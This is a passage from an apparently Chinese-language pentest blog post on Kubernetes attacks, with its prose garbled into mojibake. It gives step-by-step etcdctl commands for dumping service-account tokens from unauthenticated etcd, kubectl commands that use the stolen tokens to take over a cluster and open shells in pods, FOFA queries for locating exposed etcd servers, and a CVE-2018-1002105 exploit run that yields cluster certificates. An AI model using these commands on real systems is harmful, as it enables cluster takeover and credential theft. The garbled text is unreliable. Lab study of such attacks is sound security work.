href="https://ip:2379/version%EF%BC%8C%E7%9A%84%E6%97%B6%E5%80%99%E5%87%BA%E7%8E%B0%E7%89%88%E6%9C%AC%E5%8F%B7%EF%BC%8C%E8%AF%B4%E6%98%8E%E5%AD%98%E5%9C%A8etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E3%80%82%E6%88%96%E8%80%85%60curl">https://ip:2379/versionï¼Œçš„æ—¶å€™å‡ºç°ç‰ˆæœ¬å·ï¼Œè¯´æ˜å­˜åœ¨etcdæœªæˆæƒã€‚æˆ–è€…`curl</a> <a href="https://ip:2379/version">https://ip:2379/version</a> -k`</p><p><img src="/images/k8s/image-20240104145945782.png" alt="image-20240104145945782"></p><p><img src="/images/k8s/image-20240104143249101.png" alt="image-20240104143249101"></p><p>è¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨etcdctlæ‰“äº†ï¼Œ<br>é¦–å…ˆå®‰è£…etcdctlï¼Œåœ¨kaliä¸­ï¼Œç›´æ¥<code>apt install etcd-client</code>å³å¯<br><code>etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  / --keys-only --prefix=true</code>æµ‹è¯•ä¸€ä¸‹</p><p><img src="/images/k8s/image-20240104150302852.png" alt="image-20240104150302852"></p><p><code>ç»è¿‡å¯¹å‡ ä¸ªå¤§å¸ˆå‚…çš„æ–‡ç« åˆ†æï¼Œè¿™ä¸ªetcdæœªæˆæƒæ¼æ´ï¼Œéƒ½æ˜¯ç›´æ¥è·å–apiserverçš„tokenï¼Œç„¶åå»åˆ°6443ç«¯å£æ¥ç®¡æ•´ä¸ªé›†ç¾¤</code><br>etcdctl â€“insecure-transport=false â€“insecure-skip-tls-verify â€“endpoints=<a href="https://ip:2379/">https://ip:2379/</a> get  / â€“keys-only â€“prefix=true<br>æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ä¼šæ˜¾ç¤ºå¾ˆå¤špodsï¼Œimageså’Œå…¶ä»–ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦ç­›é€‰ä¸€ä¸‹é‡è¦çš„<br><code>etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  --keys-only --prefix=true &quot;/&quot; | grep /secrets/kube-system/clusterrole</code></p><p><img src="/images/k8s/image-20240104154342453.png" alt="image-20240104154342453"></p><p>å°±å¯ä»¥çœ‹åˆ°è¿™ä¸ªpodsäº†ï¼Œ<br>æ¥ä¸‹æ¥ç›´æ¥<code>etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  /registry/secrets/kube-system/clusterrole-aggregation-controller-token-c2vnw</code>æŠŠé‚£ä¸ªgetåé¢çš„æ›¿æ¢æ‰å³å¯<br><img src="/images/k8s/image-20240104154543659.png" alt="image-20240104154543659"></p><p>tokenå°±åœ¨ä¸‹é¢<br><img src="/images/k8s/image-20240104154641021.png" alt="image-20240104154641021"></p><p>kubectl â€“insecure-skip-tls-verify -s <a href="https://ip:6443/">https://ip:6443</a> â€“token=â€eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLW50cGcyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5Y2I0MGU3OC05NDllLTRhZTUtYWQ2OC1mNWU4MjVjNjg1YTAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.cJhYptSRTfI2SPTJBEMGvgmQQHTapQuUu7jJZbAlMzOiSJtaotjLZaQJo8DpoEbg0iTI_2CyC_vPqY0nj6dQyMdu5gV7nXJTJ-H5Po30-vP13bCSDesILPjP-gDMJfbrsB4RwYq_ngTnytm0MBC4k2ZBx2BH6mCXpQaGq_eU0ItmbZhKUmHSocp8AqaLsA_GAdtjhcl6whWvva1zQfWeHJ1tNrqrsmNVAXAeHQnBpJV72FFOtwi6oXryA0a4yV4QuMdYdhhEpS1fObN0_bTB7XasRB0CF9fWuKEgE4FPaUHeq2KV3CHf2Y9JhF3pI3SmQlBZ7G2kGLLB3UYViFa-Pwâ€ -n kube-system get pods</p><p>eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLW50cGcyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5Y2I0MGU3OC05NDllLTRhZTUtYWQ2OC1mNWU4MjVjNjg1YTAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.cJhYptSRTfI2SPTJBEMGvgmQQHTapQuUu7jJZbAlMzOiSJtaotjLZaQJo8DpoEbg0iTI_2CyC_vPqY0nj6dQyMdu5gV7nXJTJ-H5Po30-vP13bCSDesILPjP-gDMJfbrsB4RwYq_ngTnytm0MBC4k2ZBx2BH6mCXpQaGq_eU0ItmbZhKUmHSocp8AqaLsA_GAdtjhcl6whWvva1zQfWeHJ1tNrqrsmNVAXAeHQnBpJV72FFOtwi6oXryA0a4yV4QuMdYdhhEpS1fObN0_bTB7XasRB0CF9fWuKEgE4FPaUHeq2KV3CHf2Y9JhF3pI3SmQlBZ7G2kGLLB3UYViFa-Pw</p><p>è¿™é‡Œç»è¿‡æµ‹è¯•ï¼Œå‘ç°clusterrole-aggregation-controller-token-c2vnwçš„æƒé™æ˜¯å¾ˆå°çš„ï¼Œå¦‚æœè¿œç¨‹æ‰“ï¼Œæ˜¯è·å–ä¸åˆ°podsçš„ï¼Œ403ã€‚</p><p><img src="/images/k8s/image-20240104162713928.png" alt="image-20240104162713928"></p><p>å½“ç„¶ï¼Œå¦‚æœæœºå™¨å®‰è£…äº†dashboardï¼Œä¹Ÿå¯ä»¥è·å–é¢æ¿çš„token<br><img src="/images/k8s/image-20240104163233783.png" alt="image-20240104163233783"></p><p><img src="/images/k8s/image-20240104163304042.png" alt="image-20240104163304042"></p><p>é¢æ¿çš„tokenä¹Ÿæ˜¯ä¸å¯ä»¥çš„ã€‚</p><p><img src="/images/k8s/image-20240104163501532.png" alt="image-20240104163501532"></p><p><code>ç»è¿‡åˆ†æå…¶ä»–å¤§å¸ˆå‚…çš„æ–‡ç« ï¼Œè¿™é‡Œä¸æ”¾æ”¾ä¸ªå…¶ä»–å¤§å¸ˆå‚…çš„å›¾äº†ï¼Œä»”ç»†æŸ¥çœ‹ä¼šå‘ç°ä»–ä»¬æ‰“çš„æ—¶å€™ï¼Œéƒ½æ˜¯æ‰“çš„æœ¬æœºï¼Œä¹Ÿå°±æ˜¯127.0.0.1,æˆ–è€…æœ¬æœºçš„å†…ç½‘åœ°å€,è¿™æ˜¯èƒ½å¤Ÿæ‰“é€šçš„.emmmmmï¼Œå¦‚æœæ˜¯å†…ç½‘ï¼Œè¿™æ ·çš„è¯å°±ä¸ç”¨é‚£ä¹ˆéº»çƒ¦äº†ï¼Œå¦‚ä¸‹å›¾</code></p><p><img src="/images/k8s/image-20240104164034626.png" alt="image-20240104164034626"></p><p>è¿™é‡Œçš„è¯ï¼Œè¿˜å¯ä»¥çœ‹çœ‹å…¶ä»–podsï¼Œè¿™é‡Œç»è¿‡æµ‹éªŒï¼Œç›´æ¥åŒ¹é…adminå³å¯</p><p><img src="/images/k8s/image-20240104165552558.png" alt="image-20240104165552558"></p><p>æ‰¾è¿™ç§å¸¦secertçš„ï¼Œå¤§æ¦‚ç‡å°±æ˜¯æœ‰æƒé™çš„ï¼Œå†å»è¯·æ±‚ï¼Œå°±å¯ä»¥</p><p><img src="/images/k8s/image-20240104165844883.png" alt="image-20240104165844883"></p><p><img src="/images/k8s/image-20240104165820101.png" alt="image-20240104165820101"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è·å–æŸä¸ªpodsä¿¡æ¯</span></span><br><span class="line">etcdctl --insecure-transport=<span class="literal">false</span> --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  --keys-only --prefix=<span class="literal">true</span> <span class="string">&quot;/&quot;</span> | grep dashboard</span><br><span class="line"><span class="comment">#è·å–æŸä¸ªpodsadminä¿¡æ¯</span></span><br><span class="line">etcdctl --insecure-transport=<span class="literal">false</span> --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  --keys-only --prefix=<span class="literal">true</span> <span class="string">&quot;/&quot;</span> | grep admin</span><br><span class="line"><span class="comment">#è·å–token</span></span><br><span class="line">etcdctl --insecure-transport=<span class="literal">false</span> --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  /registry/secrets/kubernetes-dashboard/admin-user-token-h9sqp</span><br><span class="line"><span class="comment">#æ¥ç®¡é›†ç¾¤</span></span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443/ --token=<span class="string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLWg5c3FwIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJkODliYzBmNi01YzlmLTQ1YWItYTAyYi1hZGIyZjJhZGE5MjEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.YU547FavovN-pugK8Oe4tJ9bLpmv8VKIMBumqHEnqaB8Y4cJkQrvkYcgPaRFMDFizK75i8wTSTMxU4U2lQ4Jhl_GY_5jQ-zYvt5z8IY3azGiiOOD-Q38HpYZjPuzJWnopp6ROuSvJGT-ynPopl9xhKCcuZjAfuzYkx8wBu856-6wWUbnndF_GVtz9QrjUHysNHIDa2ECA4cCFVmZtjFlY9108lS6GIuIlhDs7089o-3odDL5tVEdd8yMilHW7Vrb5QxWpEUDRd99meKPohtv4LhzJdJTZ3SD9PRRZFGkIU-PGjyrwgub9uaI4R7vXlSwVqV_PpnfGZnPUSom4I4UDg&quot;</span> -n kube-system get pods</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸä¸ªpodsæ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443/ --token=<span class="string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLWg5c3FwIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJkODliYzBmNi01YzlmLTQ1YWItYTAyYi1hZGIyZjJhZGE5MjEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.YU547FavovN-pugK8Oe4tJ9bLpmv8VKIMBumqHEnqaB8Y4cJkQrvkYcgPaRFMDFizK75i8wTSTMxU4U2lQ4Jhl_GY_5jQ-zYvt5z8IY3azGiiOOD-Q38HpYZjPuzJWnopp6ROuSvJGT-ynPopl9xhKCcuZjAfuzYkx8wBu856-6wWUbnndF_GVtz9QrjUHysNHIDa2ECA4cCFVmZtjFlY9108lS6GIuIlhDs7089o-3odDL5tVEdd8yMilHW7Vrb5QxWpEUDRd99meKPohtv4LhzJdJTZ3SD9PRRZFGkIU-PGjyrwgub9uaI4R7vXlSwVqV_PpnfGZnPUSom4I4UDg&quot;</span> <span class="built_in">exec</span> -n metarget -it thinkphp-5-0-23-rce-web-7bb696c45b-x5z9k  sh</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240104171320120.png" alt="image-20240104171320120"></p><h6 id="å®æˆ˜åˆ©ç”¨"><a href="#å®æˆ˜åˆ©ç”¨" class="headerlink" title="å®æˆ˜åˆ©ç”¨"></a>å®æˆ˜åˆ©ç”¨</h6><p>å…ˆè®°ä¸ªfofaè¯­æ³•å§ï¼Œå°±ä¸å®æˆ˜åˆ©ç”¨äº†ï¼Œæ²¡æœ‰æˆæƒï¼Œå®³æ€•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fofaè¯­æ³•: Etcd &amp;&amp; port=&quot;2379&quot;</span><br><span class="line">fofaè¯­æ³•: Etcd &amp;&amp; port=&quot;2379&quot; &amp;&amp; country=&quot;CN&quot; //æœä¸­å›½è¿™è¾¹etcdåè®®å¹¶ä¸”æ˜¯2379ç«¯å£çš„ip/åŸŸå</span><br></pre></td></tr></table></figure><p>æ€»çš„æ¥è¯´ï¼Œetcdçš„æœªæˆæƒæ¼æ´æ„Ÿè§‰åœ¨å®æˆ˜ä¸­ç¢°åˆ°ä¼šå¾ˆå°‘ï¼Œä¸ºä»€ä¹ˆè¿™æ ·è¯´å‘¢ï¼Œå› ä¸ºè¿™ä¸ªæ¼æ´å­˜åœ¨æ˜¯å› ä¸ºæ”¹äº†é¢æ¿çš„ä¸€ä¸ªé…ç½®ï¼Œè€Œè¿™ä¸ªé…ç½®ï¼Œå¯èƒ½å¾ˆå°‘ç®¡ç†å‘˜ä¼šæ”¹ï¼Œå› ä¸ºæ²¡æœ‰å‘ç°æœ‰å•¥åŠ¨æœºèƒ½æ”¹è¿™ä¸ªé…ç½®ã€‚</p><h5 id="å†å²apiserverææƒæ¼æ´-CVE-2018-1002105"><a href="#å†å²apiserverææƒæ¼æ´-CVE-2018-1002105" class="headerlink" title="å†å²apiserverææƒæ¼æ´(CVE-2018-1002105)"></a>å†å²apiserverææƒæ¼æ´(<code>CVE-2018-1002105</code>)</h5><p>CVE-2018-1002105æ˜¯ä¸€ä¸ªK8sææƒæ¼æ´ï¼ŒKubernetesç”¨æˆ·å¯ä»¥åœ¨å·²å»ºç«‹çš„API Serverè¿æ¥ä¸Šï¼Œæ‰“é€šäº†clientåˆ°kubeletçš„é€šé“ï¼Œå®ç°æå‡k8sæ™®é€šç”¨æˆ·åˆ°k8s api serverçš„æƒé™ã€‚</p><h6 id="æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="æ¼æ´å½±å“ç‰ˆæœ¬:"></a>æ¼æ´å½±å“ç‰ˆæœ¬:</h6><ul><li>Kubernetes v1.0.x-1.9.x</li><li>Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)</li><li>Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)</li><li>Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)</li></ul><p><img src="/images/k8s/image-20240105101906393.png" alt="image-20240105101906393"></p><h6 id="æ¼æ´åˆ©ç”¨æ¡ä»¶"><a href="#æ¼æ´åˆ©ç”¨æ¡ä»¶" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¡ä»¶:"></a>æ¼æ´åˆ©ç”¨æ¡ä»¶:</h6><p>å‚è€ƒ<code>https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/#3-k8s-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E---cve-2018-1002105</code></p><p>k8sæ­£å¸¸è¯·æ±‚æ‰§è¡Œçš„é“¾è·¯æ˜¯ <code>client --&gt; apiserver --&gt; kubelet</code></p><p>å³ client é¦–å…ˆå¯¹ apiserver å‘èµ·è¯·æ±‚ï¼Œä¾‹å¦‚å‘é€è¯·æ±‚ [è¿æ¥æŸä¸€ä¸ªå®¹å™¨å¹¶æ‰§è¡Œ exec] ï¼Œè¯·æ±‚é¦–å…ˆä¼šè¢«å‘åˆ° apiserverï¼Œapiserver æ”¶åˆ°è¯·æ±‚åé¦–å…ˆå¯¹è¯¥è¯·æ±‚è¿›è¡Œè®¤è¯æ ¡éªŒï¼Œå¦‚æœæ­¤æ—¶ä½¿ç”¨çš„æ˜¯åŒ¿åç”¨æˆ·ï¼Œapi server ä¸Šæ˜¯å¯ä»¥é€šè¿‡è®¤è¯çš„ï¼Œä½†ä¼šæˆæƒå¤±è´¥ï¼Œå³ client åªèƒ½èµ°åˆ° apiserver è€Œåˆ°ä¸äº† kubelet å°±è¢«è¿”å› 403 å¹¶æ–­å¼€è¿æ¥äº†ã€‚</p><p>æ‰€ä»¥æœ¬æ¬¡æ”»å‡»çš„å…ˆå†³æ¡ä»¶æ˜¯ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå¯ä»¥ä» client åˆ° apiserver åˆ° kubelet æ•´ä¸ªé“¾è·¯é€šä¿¡è®¤è¯é€šè¿‡çš„ç”¨æˆ·ã€‚ä¸”è¦çŸ¥é“tokenï¼Œä¹Ÿå°±æ˜¯é‚£ä¸ªcsvé‡Œçš„æ–‡ä»¶passwordã€‚<br>æœ‰äº›æ–‡ç« å†™çš„æ˜¯è·å–åˆ°ä¸€ä¸ªä¸»æœºçš„rootæƒé™ï¼Œç„¶åç¬”è€…å°±ä»¥ä¸ºå¦‚æœæ‹¿åˆ°ä¸€ä¸ªshellæ˜¯rootæƒé™å³å¯ï¼Œå…¶å®ä¸æ˜¯ã€‚å‡†ç¡®çš„æ¥è¯´æ˜¯æœ‰ä¸€ä¸ªä½æƒé™çš„podå‘½ä»¤æ‰§è¡Œçš„æƒé™ï¼Œè¿˜æœ‰tokenå¯†ç ã€‚è¿™ä¸ªå¯†ç çš„ä½œç”¨æ˜¯é‰´æƒå‡†å¤‡å¥½çš„podsçš„ï¼Œä½†æ˜¯ä¸é¥¿èƒ½è®¿é—®å…¶ä»–pods,æ¥å®ç°è¶Šæƒã€‚</p><h6 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨:"></a>æ¼æ´åˆ©ç”¨:</h6><p><a href="https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py">https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"># cve_2018_1002105_pod.yaml</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">  namespace: test</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: ubuntu</span><br><span class="line">    image: nginx:1.14.2</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    # Just spin &amp; wait forever</span><br><span class="line">    command: [ &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;--&quot; ]</span><br><span class="line">    args: [ &quot;while true; do sleep 30; done;&quot; ]</span><br><span class="line">  serviceAccount: default</span><br><span class="line">  serviceAccountName: default</span><br><span class="line"> </span><br><span class="line"># cve_2018_1002105_namespace.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Namespace</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line"> </span><br><span class="line"># cve_2018_1002105_role.yaml</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: Role</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">  namespace: test</span><br><span class="line">rules:</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - pods</span><br><span class="line">  verbs:</span><br><span class="line">  - get</span><br><span class="line">  - list</span><br><span class="line">  - delete</span><br><span class="line">  - watch</span><br><span class="line">- apiGroups:</span><br><span class="line">  - &quot;&quot;</span><br><span class="line">  resources:</span><br><span class="line">  - pods/exec</span><br><span class="line">  verbs:</span><br><span class="line">  - create</span><br><span class="line">  - get</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># cve_2018_1002105_role_binding.yaml</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: RoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">  namespace: test</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: Role</span><br><span class="line">  name: test</span><br><span class="line">subjects:</span><br><span class="line">- apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: Group</span><br><span class="line">  name: test</span><br><span class="line">  </span><br><span class="line">kubectl apply -f cve_2018_1002105_namespace.yaml</span><br><span class="line">kubectl apply -f cve_2018_1002105_role.yaml </span><br><span class="line">kubectl apply -f cve_2018_1002105_rolebinding.yaml</span><br><span class="line">kubectl apply -f cve_2018_1002105_pod.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240105105544003.png" alt="image-20240105105544003"></p><p>è¿™é‡Œéƒ½é…ç½®å®Œæˆä¹‹åï¼Œä¹Ÿå¯ä»¥å®‰è£…å®Œæˆï¼Œä½†æ˜¯æµ‹è¯•è¯·æ±‚çš„æ—¶å€™ï¼ŒæŠ¥è¿™ä¸ªæ²¡æœ‰æ‰¾åˆ°ubuntuå®¹å™¨ï¼Œä¸çŸ¥é“ä¸ºå•¥<br><img src="/images/k8s/image-20240105145031836.png" alt="image-20240105145031836"></p><p>çœ‹äº†ä¸€ä¸‹ï¼Œå¥½åƒçœŸçš„æ²¡æœ‰ã€‚</p><p><img src="/images/k8s/image-20240105145248308.png" alt="image-20240105145248308"></p><p><code>è¿™é‡Œè¦æ³¨æ„ï¼Œç¬”è€…åœ¨è¿™é‡Œæ­å»ºç¯å¢ƒçš„æ—¶å€™ï¼Œå‘ç°ï¼Œè¿™ä¸ªpodæ–‡ä»¶å¦‚æœimageå†™  image: ubuntu:latestï¼Œæ˜¯èµ·ä¸æ¥ç¯å¢ƒçš„ï¼ŒæŠŠimageæ¢æˆä¸Šé¢çš„image: nginx:1.14.2ï¼Œè¿™æ ·å°±å¯ä»¥èµ·æ¥äº†</code></p><p><img src="/images/k8s/image-20240105154754259.png" alt="image-20240105154754259"></p><p>ç®€å•è®°å½•ä¸€ä¸‹æ€è·¯å§ã€‚å°±æ˜¯è·å–åˆ°ä¸€ä¸ªpodæƒé™åï¼Œä½¿ç”¨<code>https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py</code>jè„šæœ¬æ‰“ï¼Œå¡«å†™ä¸€äº›ä¿¡æ¯ï¼Œ</p><p>è¿™é‡Œåœ¨ä½¿ç”¨exploit.pyçš„æ—¶å€™ï¼Œæ²¡æœ‰ä¸€ä¸ªå«http_parserçš„åº“</p><p>aceback (most recent call last):<br>  File â€œ/tools/others/exp.pyâ€, line 15, in <module><br>    from http_parser.parser import HttpParser<br>ModuleNotFoundError: No module named â€˜http_parserâ€™</p><p>During handling of the above exception, another exception occurred:</p><p>Traceback (most recent call last):<br>  File â€œ/tools/others/exp.pyâ€, line 17, in <module><br>    from http_parser.pyparser import HttpParser<br>ModuleNotFoundError: No module named â€˜http_parserâ€™</p><p>åœ¨kaliä¸Šé¢è£…åŠå¤©æ²¡æœ‰è£…ä¸Šï¼Œç´¢æ€§ç›´æ¥å»æˆ‘çš„ecsä¸Šè£…äº†ä¸€ä¸‹ï¼Œecs ubuntu20<br><img src="/images/k8s/image-20240105153827456.png" alt="image-20240105153827456"></p><p><code>https://github.com/benoitc/http-parser/</code>é¡¹ç›®åœ°å€ï¼Œå®‰è£…å®Œæˆåï¼Œå°±å¯ä»¥ç”¨äº†ï¼Œ</p><p><code>python3 exploit.py --target 172.16.214.18 --port 6443 --bearer-token password --namespace test --pod test</code><br>å°±å¯ä»¥è·å–åˆ°ä¸‰ä¸ªè¯ä¹¦æ–‡ä»¶ï¼Œ<br>æœ‰äº†è¿™ä¸‰ä¸ªè¯ä¹¦æ–‡ä»¶ï¼Œç›´æ¥å°±å¯ä»¥ç›´æ¥åˆ›å»ºpodsï¼Œ<br>åˆ›å»ºpodsçš„</p><p><img src="/images/k8s/image-20240105155009473.png" alt="image-20240105155009473"></p><p>å¹¶ä¸”è„šæœ¬å·²ç»æŠŠå‘½ä»¤ç»™å¥½äº†ï¼Œç›´æ¥æ‰“å³å¯ï¼Œ<br><code>kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key get pods -n kube-system</code></p><p><img src="/images/k8s/image-20240105160748881.png" alt="image-20240105160748881"></p><p>æ‹¿åˆ°ä¸‰ä¸ªæ–‡ä»¶ï¼Œå°±ç›¸å½“äºï¼Œæ¥ç®¡äº†æ•´ä¸ªé›†ç¾¤äº†ï¼Œæ¥ç€ä¸Šé¢çš„ä»»æ„podsrceå³å¯ã€‚</p><h6 id="k8sé€ƒé€¸"><a href="#k8sé€ƒé€¸" class="headerlink" 